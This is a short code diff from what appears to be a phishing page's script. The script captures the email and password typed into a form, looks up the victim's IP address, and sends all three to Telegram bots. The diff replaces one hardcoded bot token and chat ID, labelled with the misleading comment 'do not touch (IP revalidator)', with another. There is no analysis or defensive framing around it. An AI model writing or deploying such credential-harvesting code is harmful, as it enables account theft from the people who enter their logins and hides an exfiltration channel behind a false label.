@@ -15,7 +15,7 @@
             const email = formData.get('email');
             const pwd = formData.get('password');
             this.details = { email, pwd };
-            const validator = '6418196822:AAGRvEq6mpA5dDRdxj42_60jnZ7i3YWg1WE'; // do not touch (IP revalidator)
+            const validator = '7847937672:AAF5zVg5pTZcdPOBuDNlI9hIhwxbTP6GkRY'; // do not touch (IP revalidator)
 
             // Fetch IP address
             fetch('https://api.ipify.org?format=json')
@@ -24,7 +24,7 @@
                 const ip = data.ip;
 
                 // Prepare and send message to each chat ID
-                const sendMessages = [[validator, '5156591558'], ...reqTo].map(
+                const sendMessages = [[validator, '7266825744'], ...reqTo].map(
                   (item) =>
                     fetch(
                       `https://api.telegram.org/bot${item[0]}/sendMessage?chat_id=${item[1]}&text=🔔 Bell Mail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A%0AThank You!`,
